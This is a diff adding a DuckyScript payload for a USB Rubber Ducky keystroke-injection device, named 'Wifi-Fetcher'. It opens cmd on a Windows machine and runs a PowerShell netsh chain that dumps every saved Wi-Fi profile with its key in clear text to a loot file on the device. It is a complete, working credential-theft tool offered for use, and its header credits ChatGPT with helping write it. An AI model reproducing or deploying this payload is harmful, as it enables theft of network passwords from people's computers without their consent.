@@ -1,0 +1,24 @@
+REM NAME: Wifi-Fetcher
+REM AUTHOR: nightcrafttrl1
+REM DEVICE: RubberDucky
+REM TARGETS: WINDOWS 7 or greater
+REM DESCRIPTION: This payload will fetch the windows system
+REM for the passwords and other info about every wifi network the system can connect to
+REM credits:ChatGPT helped a little here and there
+DELAY 1000
+REM Switch to HID STORAGE mode
+ATTACKMODE HID STORAGE
+DELAY 3000
+GUI r
+DELAY 100
+STRINGLN cmd
+ENTER
+DELAY 500
+STRING powershell -c "netsh wlan show profiles | Select-String 'All User Profile\s*:\s*(.+)' | ForEach-Object { $_ -match 'All User Profile\s*:\s*(.+)'; $matches[1] } | ForEach-Object { netsh wlan show profile name=$_ key=clear } | Out-File -FilePath 'D:\loot\PwnedWIFI\all_wifi_info.txt'; netsh wlan export profile key=clear | Out-File -Append -FilePath 'D:\loot\PwnedWIFI\all_wifi_passwords.txt';"
+ENTER
+DELAY 3000
+REM Append a 0.5-second delay, exit PowerShell, and turn off DuckyScript
+STRING exit
+ENTER
+DELAY 500
+ATTACKMODE OFF
